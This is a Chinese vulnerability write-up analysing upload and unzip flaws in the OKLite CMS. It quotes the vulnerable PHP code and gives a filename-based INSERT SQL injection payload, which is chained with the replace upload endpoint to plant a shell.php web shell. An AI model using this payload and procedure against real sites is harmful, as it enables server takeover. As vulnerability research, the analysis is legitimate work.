&#x9664;&#x4E86;&#x9879;&#x76EE;&#x7BA1;&#x7406;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x6709;project_module.php&#x4E5F;&#x540C;&#x6837;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x3002;&#x6F0F;&#x6D1E;&#x539F;&#x56E0;&#x4E5F;&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002; plugin_control.php&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;&#x548C;&#x524D;&#x4E00;&#x4E2A;module_control&#x6709;&#x6240;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;zip&#x6587;&#x4EF6;&#x5939;&#x5FC5;&#x987B;&#x662F;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6587;&#x4EF6;&#x5939;&#x4E2D;&#x518D;&#x5305;&#x542B;&#x6076;&#x610F;&#x6587;&#x4EF6;&#x3002; &#x63D2;&#x4EF6;&#x4E2D;&#x5FC3;&#xFF1A; &#x9A8C;&#x8BC1;&#x65B9;&#x5F0F;&#x540C;&#x524D;&#x4E00;&#x4E2A;&#xFF0C;&#x5C31;&#x4E0D;&#x91CD;&#x590D;&#x4E86;&#x3002; &#x4E0A;&#x4F20;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#x4F1A;&#x8BBF;&#x95EE;&#x53E6;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#xFF1A; http://localhost/admin.php?c=plugin&amp;f=unzip&amp;id=1196&amp;_noCache=0.08112707662168439&amp;_=1570257969464 &#x6F0F;&#x6D1E;&#x5206;&#x6790;framework\\admin\\plugin_control.php&#xFF1A; 12345678910111213141516171819202122232425262728293031public function unzip_f(){ $id = $this-&gt;get(&apos;id&apos;,&apos;int&apos;); $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id); if(!$rs){ $this-&gt;json(P_Lang(&apos;&#x9644;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&apos;)); } if($rs[&apos;ext&apos;] != &apos;zip&apos;){ $this-&gt;json(P_Lang(&apos;&#x975E;ZIP&#x6587;&#x4EF6;&#x4E0D;&#x652F;&#x6301;&#x5728;&#x7EBF;&#x89E3;&#x538B;&apos;)); } if(!file_exists($this-&gt;dir_root.$rs[&apos;filename&apos;])){ $this-&gt;json(P_Lang(&apos;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&apos;)); } $info = $this-&gt;lib(&apos;phpzip&apos;)-&gt;zip_info($this-&gt;dir_root.$rs[&apos;filename&apos;]); $info = current($info); if(!$info[&apos;filename&apos;]){ $this-&gt;json(P_Lang(&apos;&#x63D2;&#x4EF6;&#x6709;&#x5F02;&#x5E38;&apos;)); } $info = explode(&apos;/&apos;,$info[&apos;filename&apos;]); if(!$info[0]){ $this-&gt;json(P_Lang(&apos;&#x63D2;&#x4EF6;&#x6709;&#x5F02;&#x5E38;&apos;)); } if(file_exists($this-&gt;dir_root.&apos;plugins/&apos;.$info[0])){ $this-&gt;json(P_Lang(&apos;&#x63D2;&#x4EF6;&#x5DF2;&#x5B58;&#x5728;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x91CD;&#x590D;&#x89E3;&#x538B;&apos;)); } if(!$info[1]){ $this-&gt;json(P_Lang(&apos;&#x63D2;&#x4EF6;&#x6253;&#x5305;&#x6A21;&#x5F0F;&#x6709;&#x95EE;&#x9898;&apos;)); } $this-&gt;lib(&apos;phpzip&apos;)-&gt;unzip($this-&gt;dir_root.$rs[&apos;filename&apos;],$this-&gt;dir_root.&apos;plugins/&apos;); $this-&gt;json(true);} &#x5728;&#x4F7F;&#x7528;get_one&#x83B7;&#x53D6;&#x4E86;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#x4E4B;&#x540E;&#xFF0C;&#x4F20;&#x5165;&#x5230;&#x4E86;$this-&gt;lib(&apos;phpzip&apos;)-&gt;zip_info();&#x4E2D;&#x83B7;&#x53D6;zip&#x7684;&#x4FE1;&#x606F;&#x4F20;&#x9012;&#x7ED9;$info&#x53D8;&#x91CF;&#x3002; zip_info()&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF0C;&#x6210;&#x5458;1&#x4E3A;&#x538B;&#x7F29;&#x5305;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x540D;&#x79F0;&#xFF0C;&#x6210;&#x5458;2&#x4E3A;&#x6587;&#x4EF6;&#x5939;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x3002; &#x5982;&#x679C;&#x683C;&#x5F0F;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x8BDD;&#xFF0C;if(!$info[1])&#x8FD9;&#x91CC;&#x5C31;&#x4F1A;&#x62A5;&#x63D2;&#x4EF6;&#x6253;&#x5305;&#x6A21;&#x5F0F;&#x6709;&#x95EE;&#x9898;&#x7684;&#x9519;&#x8BEF;&#x3002; &#x683C;&#x5F0F;&#x901A;&#x8FC7;&#x4E86;&#x4E4B;&#x540E;&#x5C31;&#x662F;&#x76F4;&#x63A5;&#x89E3;&#x538B;&#x4E86;&#x3002; &#x6700;&#x540E;&#x4FDD;&#x5B58;&#x7684;&#x76EE;&#x5F55;&#x4E3A;&#xFF1A;WWW\\plugins SQL&#x6CE8;&#x5165;&#x5BFC;&#x81F4;getshell(&#x524D;&#x53F0;)&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x5728;2017&#x5E74;&#x5728;PHPOK&#x5F53;&#x4E2D;&#x5C31;&#x88AB;&#x7545;&#x5E08;&#x5085;&#x5C31;&#x88AB;&#x53D1;&#x73B0;&#x4E86;&#x3002;PHPOK&#x7CFB;&#x7EDF;&#x88AB;&#x4FEE;&#x590D;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x5728;OKLite&#x5F53;&#x4E2D;&#x8FD8;&#x5B58;&#x5728;&#x3002; &#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;&#x5730;&#x5740;&#xFF1A;http://localhost/index.php?id=message &#x5728;&#x7EBF;&#x7559;&#x8A00;&#x5904;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#x5E76;&#x6293;&#x5305;&#xFF0C;&#x628A;&#x6587;&#x4EF6;&#x540D;&#x4FEE;&#x6539;&#x4E3A;&#xFF1A; 1&apos;,&apos;pf3qm0js3gb2s5f33r7lf14vl3&apos;,&apos;30&apos;),(&apos;1&apos;,0x7265732f3230313931302f30342f,&apos;shell.jpg&apos;,&apos;jpg&apos;,0x7265732f3230313931302f30352f7368656c6c2e706870,&apos;1570161575&apos;,&apos;abc &#x4E0A;&#x4F20;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x4F1A;&#x8FD4;&#x56DE;&#x56FE;&#x7247;&#x7684;id&#x548C;&#x4FDD;&#x5B58;&#x7684;&#x8DEF;&#x5F84;&#xFF1A; &#x518D;&#x6B21;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#xFF0C;&#x628A;&#x5730;&#x5740;&#x4E2D;&#x7684;save&#x6539;&#x6210;replace&#xFF0C;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x540D;&#x4E3A;oldid&#xFF0C;&#x503C;&#x4E3A;&#x56FE;&#x7247;&#x7684;id + 1&#x3002; &#x56FE;&#x7247;&#x7684;&#x5185;&#x5BB9;&#x6539;&#x4E3A;&#x6076;&#x610F;&#x7684;php&#x4EE3;&#x7801;&#xFF1A; &#x4E0A;&#x4F20;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#x53EF;&#x5728;res\\201910\\05&#x76EE;&#x5F55;&#x4E0B;&#x751F;&#x6210;&#x4E00;&#x4E2A;shell.php &#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x6587;&#x4EF6;&#x5730;&#x5740;&#x4E3A;&#xFF1A;framework\\www\\upload_control.php 123456789101112131415//&#x9644;&#x4EF6;&#x4E0A;&#x4F20;public function save_f(){ if(!$this-&gt;site[&apos;upload_guest&apos;]){ $this-&gt;json(P_Lang(&apos;&#x7CFB;&#x7EDF;&#x5DF2;&#x7981;&#x6B62;&#x6E38;&#x5BA2;&#x4E0A;&#x4F20;&#xFF0C;&#x8BF7;&#x8054;&#x7CFB;&#x7BA1;&#x7406;&#x5458;&apos;)); } $cateid = $this-&gt;get(&apos;cateid&apos;,&apos;int&apos;); $rs = $this-&gt;upload_base(&apos;upfile&apos;,$cateid); if(!$rs || $rs[&apos;status&apos;] != &apos;ok&apos;){ $this-&gt;json($rs[&apos;error&apos;]); } unset($rs[&apos;status&apos;]); $rs[&apos;uploadtime&apos;] = date(&quot;Y-m-d H:i:s&quot;,$rs[&apos;addtime&apos;]); $this-&gt;json($rs,true);} &#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E86;$this-&gt;upload_base(&apos;upfile&apos;,$cateid);&#x8FDB;&#x884C;&#x6587;&#x4EF6;&#x4E0A;&#x4F20; 12345678910111213141516171819202122232425262728293031private function upload_base($input_name=&apos;upfile&apos;,$cateid=0){ $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid); if($rs[&quot;status&quot;] != &quot;ok&quot;){ return $rs; } $array = array(); $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;]; $array[&quot;folder&quot;] = $rs[&apos;folder&apos;]; $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]); $array[&quot;ext&quot;] = $rs[&apos;ext&apos;]; $array[&quot;filename&quot;] = $rs[&apos;filename&apos;]; $array[&quot;addtime&quot;] = $this-&gt;time; $array[&quot;title&quot;] = $rs[&apos;title&apos;]; $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid(); $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;); if(in_array($rs[&quot;ext&quot;],$arraylist)){ $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]); $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]); $array[&quot;attr&quot;] = serialize($my_ext); } $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array); if(!$id){ $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.$rs[&apos;filename&apos;]); return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;&#x56FE;&#x7247;&#x5B58;&#x50A8;&#x5931;&#x8D25;&apos;)); } $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id); $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id); $rs[&quot;status&quot;] = &quot;ok&quot;; return $rs;} &#x5728;upload_base&#x5F53;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;$this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);&#x83B7;&#x53D6;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x3002; framework\\libs\\upload.php&#x4E2D;&#xFF1A; 1234567891011121314151617public function getfile($input=&apos;upfile&apos;,$cateid=0){ if(!$input){ return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;content&apos;=&gt;P_Lang(&apos;&#x672A;&#x6307;&#x5B9A;&#x8868;&#x5355;&#x540D;&#x79F0;&apos;)); } $this-&gt;_cate($cateid); //&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5206;&#x7C7B;&#x7684;&#x9884;&#x8BBE; &#x8868;&#x540D;res_cate if(isset($_FILES[$input])){ $rs = $this-&gt;_upload($input); }else{ $rs = $this-&gt;_save($input); } if($rs[&apos;status&apos;] != &apos;ok&apos;){ return $rs; } $rs[&apos;cate&apos;] = $this-&gt;cate; return $rs;} getfile()&#x9996;&#x5148;&#x8C03;&#x7528;&#x4E86;$this-&gt;_cate($cateid); &#x83B7;&#x53D6;cateid&#x4E3A;1&#x7684;&#x6587;&#x4EF6;&#x5206;&#x7C7B;&#x9884;&#x8BBE;&#xFF0C;&#x5185;&#x5BB9;&#x5305;&#x62EC;&#x4FDD;&#x5B58;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6587;&#x4EF6;&#x5939;&#x540D;&#x79F0;&#x548C;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x3002;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF1A; &#x63A5;&#x7740;&#x8C03;&#x7528;&#x4E86;$this-&gt;_upload($input)&#xFF1A; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061private function _upload($input){ $basename = substr(md5(time().uniqid()),9,16); $chunk = isset($_REQUEST[&quot;chunk&quot;]) ? intval($_REQUEST[&quot;chunk&quot;]) : 0; $chunks = isset($_REQUEST[&quot;chunks&quot;]) ? intval($_REQUEST[&quot;chunks&quot;]) : 1; $tmpname = $_FILES[$input][&quot;name&quot;]; $tmpid = &apos;u_&apos;.md5($tmpname); $ext = $this-&gt;file_ext($tmpname); $out_tmpfile = $this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$chunk; if (!$out = @fopen($out_tmpfile.&quot;.parttmp&quot;, &quot;wb&quot;)) { return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;&#x65E0;&#x6CD5;&#x6253;&#x5F00;&#x8F93;&#x51FA;&#x6D41;&apos;)); } $error_id = $_FILES[$input][&apos;error&apos;] ? $_FILES[$input][&apos;error&apos;] : 0; if($error_id){ return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;$this-&gt;up_error[$error_id]); } if(!is_uploaded_file($_FILES[$input][&apos;tmp_name&apos;])){ return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&#xFF0C;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x65E0;&#x6CD5;&#x5199;&#x5165;&apos;)); } if(!$in = @fopen($_FILES[$input][&quot;tmp_name&quot;], &quot;rb&quot;)) { return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;&#x65E0;&#x6CD5;&#x6253;&#x5F00;&#x8F93;&#x5165;&#x6D41;&apos;)); } while ($buff = fread($in, 4096)) { fwrite($out, $buff); } @fclose($out); @fclose($in); $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;file&apos;)-&gt;mv($out_tmpfile.&apos;.parttmp&apos;,$out_tmpfile.&apos;.part&apos;); $index = 0; $done = true; for($index=0;$index&lt;$chunks;$index++) { if (!file_exists($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&quot;.part&quot;) ) { $done = false; break; } } if(!$done){ return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;&apos;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x5F02;&#x5E38;&apos;); } $outfile = $this-&gt;folder.$basename.&apos;.&apos;.$ext; if(!$out = @fopen($this-&gt;dir_root.$outfile,&quot;wb&quot;)) { return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;&#x65E0;&#x6CD5;&#x6253;&#x5F00;&#x8F93;&#x51FA;&#x6D41;&apos;)); } if(flock($out,LOCK_EX)){ for($index=0;$index&lt;$chunks;$index++) { if (!$in = @fopen($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&apos;.part&apos;,&apos;rb&apos;)){ break; } while ($buff = fread($in, 4096)) { fwrite($out, $buff); } @fclose($in); $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&quot;_&quot;.$index.&quot;.part&quot;); } flock($out,LOCK_UN); } @fclose($out); $tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname); $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname); return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);} &#x8FD9;&#x91CC;&#x4F7F;&#x7528;$ext = $this-&gt;file_ext($tmpname);&#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x540E;&#x7F00;&#xFF0C;&#x770B;&#x4E0B;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#xFF1A; 12345678910111213private function file_ext($tmpname){ $ext = pathinfo($tmpname,PATHINFO_EXTENSION); if(!$ext){ return false; } $ext = strtolower($ext); $cate_exts = ($this-&gt;cate &amp;&amp; $this-&gt;cate[&apos;filetypes&apos;]) ? explode(&quot;,&quot;,$this-&gt;cate[&apos;filetypes&apos;]) : array(&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;); if(!in_array($ext,$cate_exts)){ return false; } return $ext;} &#x8FD9;&#x91CC;&#x7684;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x5C31;&#x662F;getfile()&#x4E2D;&#x8C03;&#x7528;&#x7684;$this-&gt;_cate($cateid);&#x83B7;&#x53D6;&#x5F97;&#x5230;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;&#x503C;&#x4E3A;png,jpg,gif,rar,zip&#x3002; &#x7531;&#x4E8E;&#x4F7F;&#x7528;in_array&#xFF0C;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002; &#x63A5;&#x7740;&#x56DE;&#x770B;&#x524D;&#x9762;&#xFF0C;&#x4F7F;&#x7528;&#x4E86;$tmpname = $_FILES[$input][&quot;name&quot;];&#x83B7;&#x53D6;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x800C;$tmpname&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x4EFB;&#x4F55;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x76F4;&#x63A5;&#x5230;&#x4E86;&#x6700;&#x540E;&#x53BB;&#x9664;&#x540E;&#x7F00;&#x540D;&#x8D4B;&#x503C;&#x7ED9;&#x4E86;$title&#x53D8;&#x91CF;&#x3002; $title&#x53D8;&#x91CF;&#x4F5C;&#x4E3A;&#x6570;&#x7EC4;&#x4E2D;title&#x7684;&#x952E;&#x503C;&#x8FD4;&#x56DE;&#x3002; &#x518D;&#x56DE;&#x770B;_upload&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x8D4B;&#x503C;&#x5230;$array&#x5F53;&#x4E2D;&#x3002; &#x63A5;&#x7740;&#x8C03;&#x7528;&#x4E86; $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array); &#x8DDF;&#x8E2A;&#x8FC7;&#x53BB;&#xFF1A; framework\\model\\res.php&#xFF1A; 123456789function save($data,$id=0){ if(!$data || !is_array($data)) return false; if($id){ return $this-&gt;db-&gt;update_array($data,&quot;res&quot;,array(&quot;id&quot;=&gt;$id)); }else{ return $this-&gt;db-&gt;insert_array($data,&quot;res&quot;); }} &#x8FD9;&#x91CC;&#x5E76;&#x6CA1;&#x6709;&#x8D4B;&#x503C;$id&#x53D8;&#x91CF;&#xFF0C;&#x8FDB;&#x5165;&#x5230;$this-&gt;db-&gt;insert_array($data,&quot;res&quot;);&#xFF0C;&#x7EE7;&#x7EED;&#x8DDF;&#x8E2A;&#xFF1A; framework\\engine\\db\\mysqli.php&#xFF1A; 1234567891011121314151617181920public function insert_array($data,$tbl,$type=&quot;insert&quot;){ if(!$tbl || !$data || !is_array($data)){ return false; } if(substr($tbl,0,strlen($this-&gt;prefix)) != $this-&gt;prefix){ $tbl = $this-&gt;prefix.$tbl; } $type = strtolower($type); $sql = $type == &apos;insert&apos; ? &quot;INSERT&quot; : &quot;REPLACE&quot;; $sql.= &quot; INTO &quot;.$tbl.&quot; &quot;; $sql_fields = array(); $sql_val = array(); foreach($data AS $key=&gt;$value){ $sql_fields[] = &quot;`&quot;.$key.&quot;`&quot;; $sql_val[] = &quot;&apos;&quot;.$value.&quot;&apos;&quot;; } $sql.= &quot;(&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;; return $this-&gt;insert($sql);} &#x4E00;&#x4E2A;foreach&#x5FAA;&#x73AF;&#x5C06;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x952E;&#x540D;&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x6BB5;&#x540D;&#xFF0C;&#x952E;&#x503C;&#x8F6C;&#x4E3A;&#x8981;&#x63D2;&#x5165;&#x7684;&#x503C;&#x3002; &#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x53EB;xiaonan.jpg&#xFF0C;&#x6700;&#x540E;&#x62FC;&#x63A5;&#x51FA;&#x6765;&#x7684;sql&#x8BED;&#x53E5;&#x4E3A;&#xFF1A; INSERT INTO qinggan_res (`cate_id`,`folder`,`name`,`ext`,`filename`,`addtime`,`title`,`session_id`,`attr`) VALUES(&apos;1&apos;,&apos;res/201910/05/&apos;,&apos;51514bdf089432f0.jpg&apos;,&apos;jpg&apos;,&apos;res/201910/04/51514bdf089432f0.jpg&apos;,&apos;1570161223&apos;,&apos;xiaonan&apos;,&apos;pf3qm0js3gb2s5f33r7lf14vl3&apos;,&apos;a:2:{s:5:&quot;width&quot;;i:448;s:6:&quot;height&quot;;i:400;}&apos;) &#x56E0;&#x4E3A;&#x524D;&#x9762;_upload&#x4E2D;&#x7684;$tmpname&#x53D8;&#x91CF;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x4EFB;&#x4F55;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;xiaonan&#x662F;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7684;&#x3002;&#x8FD9;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E2A;insert&#x6CE8;&#x5165;&#x3002; &#x5982;&#x679C;sql&#x8BED;&#x53E5;&#x4E3A;&#xFF1A; INSERT INTO test (`username`, `password`) VALUES(&apos;1&apos;, &apos;2&apos;), (&apos;3&apos;,&apos;4&apos;); &#x5219;&#x4F1A;&#x5728;test&#x8868;&#x4E2D;&#x63D2;&#x5165;&#x4E24;&#x884C;&#x6570;&#x636E;&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x70B9;&#x3002;&#x53EF;&#x4EE5;&#x5411;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x90FD;&#x53EF;&#x4EE5;&#x7531;&#x6211;&#x4EEC;&#x63A7;&#x5236;&#x7684;&#x6570;&#x636E;&#x3002; &#x518D;&#x914D;&#x5408;upload_control.php&#x4E2D;&#x7684;replace_f&#x65B9;&#x6CD5;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;getshell&#x3002; replace_f(&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4F5C;&#x66FF;&#x6362;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;): 12345678910111213141516171819202122232425262728293031323334353637public function replace_f(){ if(!$this-&gt;site[&apos;upload_guest&apos;]){ $this-&gt;json(P_Lang(&apos;&#x7CFB;&#x7EDF;&#x5DF2;&#x7981;&#x6B62;&#x6E38;&#x5BA2;&#x4E0A;&#x4F20;&#xFF0C;&#x8BF7;&#x8054;&#x7CFB;&#x7BA1;&#x7406;&#x5458;&apos;)); } $id = $this-&gt;get(&quot;oldid&quot;,&apos;int&apos;); if(!$id) { $this-&gt;json(P_Lang(&apos;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x8981;&#x66FF;&#x6362;&#x7684;&#x9644;&#x4EF6;&apos;)); } $old_rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id); if(!$old_rs){ $this-&gt;json(P_Lang(&apos;&#x8D44;&#x6E90;&#x4E0D;&#x5B58;&#x5728;&apos;)); } $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;upload(&apos;upfile&apos;); if($rs[&quot;status&quot;] != &quot;ok&quot;) { $this-&gt;json(P_Lang(&apos;&#x9644;&#x4EF6;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&apos;)); } $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;); $my_ext = array(); if(in_array($rs[&quot;ext&quot;],$arraylist)) { $img_ext = getimagesize($rs[&quot;filename&quot;]); $my_ext[&quot;width&quot;] = $img_ext[0]; $my_ext[&quot;height&quot;] = $img_ext[1]; } //&#x66FF;&#x6362;&#x8D44;&#x6E90; $this-&gt;lib(&apos;file&apos;)-&gt;mv($rs[&quot;filename&quot;],$old_rs[&quot;filename&quot;]); $tmp = array(&quot;addtime&quot;=&gt;$this-&gt;time); $tmp[&quot;attr&quot;] = serialize($my_ext); $this-&gt;model(&apos;res&apos;)-&gt;save($tmp,$id); //&#x66F4;&#x65B0;&#x9644;&#x4EF6;&#x6269;&#x5C55;&#x4FE1;&#x606F; $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id); $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id); $this-&gt;json($rs,true);} &#x66FF;&#x6362;&#x7684;&#x6B65;&#x9AA4;&#xFF1A; &#x83B7;&#x53D6;&#x4E86;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x540D;&#x4E3A;oldid:$id = $this-&gt;get(&quot;oldid&quot;,&apos;int&apos;); &#x4F7F;&#x7528;$this-&gt;model(&apos;res&apos;)-&gt;get_one($id); &#x4ECE;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#x83B7;&#x53D6;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4FE1;&#x606F;&#x4F20;&#x9012;&#x7ED9;$old_rs&#x53D8;&#x91CF; &#x4F7F;&#x7528;$this-&gt;lib(&apos;upload&apos;)-&gt;upload(&apos;upfile&apos;);&#x83B7;&#x53D6;&#x65B0;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#x4F20;&#x9012;&#x7ED9;$rs&#x53D8;&#x91CF;&#x3002; &#x4F7F;&#x7528;$this-&gt;lib(&apos;file&apos;)-&gt;mv($rs[&quot;filename&quot;],$old_rs[&quot;filename&quot;]);&#x8FDB;&#x884C;&#x6587;&#x4EF6;&#x7684;&#x66FF;&#x6362; &#x6765;&#x770B;mv()&#x65B9;&#x6CD5; 1234567891011121314151617181920212223242526272829/** * &#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x64CD;&#x4F5C; * @&#x53C2;&#x6570; $old &#x65E7;&#x6587;&#x4EF6;&#xFF08;&#x5939;&#xFF09; * @&#x53C2;&#x6570; $new &#x65B0;&#x6587;&#x4EF6;&#xFF08;&#x5939;&#xFF09; * @&#x53C2;&#x6570; $recover &#x662F;&#x5426;&#x8986;&#x76D6; * @&#x8FD4;&#x56DE; false/true**/public function mv($old,$new,$recover=true){ if(!file_exists($old)){ return false; } if(substr($new,-1) == &quot;/&quot;){ $this-&gt;make($new,&quot;dir&quot;); //&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x5939; }else{ $this-&gt;make($new,&quot;file&quot;); //&#x521B;&#x5EFA;&#x6587;&#x4EF6; } if(file_exists($new)){ if($recover){ unlink($new); }else{ return false; } }else{ $new = $new.basename($old); } rename($old,$new); return true;} &#x4ECE;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x5B9A;&#x4E49;&#x5F53;&#x4E2D;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x77E5;&#xFF0C;&#x4F1A;&#x5C06;&#x65B0;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x6539;&#x4E3A;&#x6307;&#x5B9A;&#x7684;id&#x6240;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x56E0;&#x4E3A;&#x524D;&#x9762;&#x7684;Insert&#x578B;&#x7684;sql&#x6CE8;&#x5165;&#xFF0C;&#x6211;&#x4EEC;&#x80FD;&#x63A7;&#x5236;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002; 